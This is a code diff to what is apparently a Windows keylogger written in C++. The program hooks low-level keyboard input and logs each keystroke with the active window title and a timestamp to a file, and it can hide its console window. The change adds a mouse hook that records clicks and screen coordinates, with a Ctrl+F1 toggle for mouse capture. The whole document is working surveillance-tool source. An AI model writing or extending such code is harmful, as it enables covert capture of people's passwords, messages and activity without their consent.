@@ -4,6 +4,7 @@
 #include <map>
 #include <ctime>
 #include <mutex>
+#include <bitset>
 #include <locale>
 #include <cstring>
 #include <fstream>
@@ -29,9 +30,6 @@ public:
 
 // Define which format to use for logging (0 for default, 10 for dec codes, 16 for hex codes)
 #define FORMAT 0
-
-// defines if ignore mouse clicks
-#define mouse_ignore
 
 // Variable to store the HANDLE to the hook. Declare it globally.
 #if FORMAT == 0
@@ -160,6 +158,7 @@ const std::map<std::string, std::string> special_eng_to_per{
 
 // Hook handle variable
 HHOOK _hook;
+HHOOK _mouseHook;
 
 // Struct to hold data received by the hook callback
 KBDLLHOOKSTRUCT kbd_struct;
@@ -169,6 +168,16 @@ std::string last_window;
 
 // Output file stream
 std::ofstream output_file;
+
+// Add global variable to track ignoring the mouse
+bool ignoreMouse = true;
+
+// Add global variables to track the state of Ctrl and F1 keys
+bool ctrlPressed = false;
+bool f1Pressed = false;
+
+// Function to check if both Ctrl and F1 are pressed
+bool areCtrlAndF1Pressed();
 
 // Function to convert a string to lowercase
 std::string toLowerCase(const std::string &str);
@@ -190,6 +199,9 @@ int getCurrentKeyboardLayout();
 
 // Save the pressed key to the output file
 int save(int key_stroke);
+
+// Save the clicked mouse key to the output file
+int saveMouse(WPARAM mouseEvent, MSLLHOOKSTRUCT *mouseStruct);
 
 // Function to hide or show the console window
 void stealth();
@@ -218,12 +230,16 @@ int main() {
     // Set the console window visibility
     stealth();
 
-    // Set the keyboard hook
+    // Set the keyboard and mouse hooks
     setHook();
 
     // Loop to keep the console application running.
     MSG msg;
     while (GetMessage(&msg, nullptr, 0, 0)) {
+        // Translate virtual-key messages into character messages
+        TranslateMessage(&msg);
+        // Dispatches a message to a window procedure
+        DispatchMessage(&msg);
     }
 }
 
@@ -240,12 +256,34 @@ std::string toLowerCase(const std::string &str) {
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
         // the action is valid: HC_ACTION.
-        if (wParam == WM_KEYDOWN) {
+        if (wParam == WM_KEYDOWN) { //|| wParam == WM_KEYUP)
             // Get the keyboard hook data
             kbd_struct = *((KBDLLHOOKSTRUCT *) lParam);
 
+            // Check for the Ctrl + F1 key combination
+            if (kbd_struct.vkCode == VK_LCONTROL)
+                ctrlPressed = true;
+            else if (kbd_struct.vkCode == VK_F1 && ctrlPressed)
+                f1Pressed = true;
+
+            // Check for the Ctrl + F1 key combination
+            if (areCtrlAndF1Pressed()) {
+                ignoreMouse = !ignoreMouse;  // Toggle the mouse events on and off
+                std::cout << "\n\n[MouseEvents" << (ignoreMouse ? "-Ignored" : "-Captured") << "]"
+                          << std::endl;
+            }
+
             // Save the key to the output file
             save(kbd_struct.vkCode);
+
+        } else if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN ||
+                   wParam == WM_XBUTTONDOWN || wParam == WM_MOUSEWHEEL) {
+
+            // Get the mouse hook data
+            MSLLHOOKSTRUCT *mouseStruct = reinterpret_cast<MSLLHOOKSTRUCT *>(lParam);
+
+            // Save the mouse event to the output file
+            saveMouse(wParam, mouseStruct);
         }
     }
 
@@ -253,14 +291,27 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
-// Set the keyboard hook
+// Set the keyboard and mouse hooks
 void setHook() {
-// Set the hook and set it to use the callback function above
+    // Set the keyboard hook
     if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, nullptr, 0))) {
+        std::cout << "here1";
         // Display an error message if hook installation fails
-        LPCWSTR a = L"Failed to install hook!";
+        LPCWSTR a = L"Failed to install keyboard hook!";
         LPCWSTR b = L"Error";
         MessageBox(nullptr, a, b, MB_ICONERROR);
+    }
+
+        // Set the mouse hook
+    else if (!(_mouseHook = SetWindowsHookEx(WH_MOUSE_LL, HookCallback, nullptr, 0))) {
+        std::cout << "here2";
+        // Display an error message if hook installation fails
+        LPCWSTR a = L"Failed to install mouse hook!";
+        LPCWSTR b = L"Error";
+        MessageBox(nullptr, a, b, MB_ICONERROR);
+
+        // Release the keyboard hook if mouse hook installation fails
+        releaseHook();
     }
 }
 
@@ -302,13 +353,6 @@ int getCurrentKeyboardLayout() {
 // Save the pressed key to the output file
 int save(int key_stroke) {
     std::stringstream output;
-
-#ifndef mouse_ignore
-    // Ignore mouse clicks
-    if ((key_stroke == 1) || (key_stroke == 2)) {
-        return 0; // ignore mouse clicks
-    }
-#endif
 
     // Get the active window handle and keyboard layout
     HWND foreground = GetForegroundWindow();
@@ -403,4 +447,84 @@ void stealth() {
 #ifdef invisible
     ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), 0); // invisible window
 #endif
+}
+
+// Add a new function to save mouse events
+int saveMouse(WPARAM mouseEvent, MSLLHOOKSTRUCT *mouseStruct) {
+    if (ignoreMouse) {
+        return 0; // Ignore mouse events if the flag is set
+    }
+
+    std::stringstream output;
+
+    // Get the active window handle
+    HWND foreground = GetForegroundWindow();
+
+    if (foreground) {
+        // Get the window title
+        wchar_t window_title[256];
+        GetWindowTextW(foreground, window_title, 256);
+
+        // Convert wide character string to UTF-8 narrow character string
+        try {
+            std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter;
+            std::string utf8_title = converter.to_bytes(window_title);
+
+            // Check if the window title has changed
+            if (utf8_title != last_window) {
+                last_window = utf8_title;
+
+                // Log the window title and current time
+//                output << "\n\n[" << getCurrentTimeAsString() << "] (" << utf8_title << ")\n";
+            }
+        } catch (const std::range_error &e) {
+            // Handle the range_error, e.g., by printing an error message.
+            std::cerr << "Error converting wide characters to UTF-8: " << e.what() << std::endl;
+        }
+    }
+
+    // Log the mouse event
+    output << "\n\n[" << getCurrentTimeAsString() << "] (" << last_window << ")\n";
+
+    switch (mouseEvent) {
+        case WM_LBUTTONDOWN:
+            output << "[LeftMouseBUTTON]";
+            break;
+        case WM_RBUTTONDOWN:
+            output << "[RightMouseBUTTON]";
+            break;
+        case WM_MBUTTONDOWN:
+            output << "[MiddleMouseBUTTON]";
+            break;
+        case WM_XBUTTONDOWN:
+            output << "[XMouseBUTTON]";
+            break;
+        case WM_MOUSEWHEEL:
+            output << "[MouseWheel]";
+            break;
+        default:
+            output << "[UnknownMouseBUTTON]";
+            break;
+    }
+
+    output << "-(" << mouseStruct->pt.x << ", " << mouseStruct->pt.y << ")";
+
+    // Instead of opening and closing file handlers every time, keep the file open and flush.
+    output_file << output.str();
+    output_file.flush();
+
+    // Print the output to the console
+    std::cout << output.str() << std::flush;
+
+    return 0;
+}
+
+// Function to check if both Ctrl and F1 are pressed
+bool areCtrlAndF1Pressed() {
+    if (ctrlPressed & f1Pressed) {
+        ctrlPressed = false;
+        f1Pressed = false;
+        return true;
+    }
+    return false;
 }
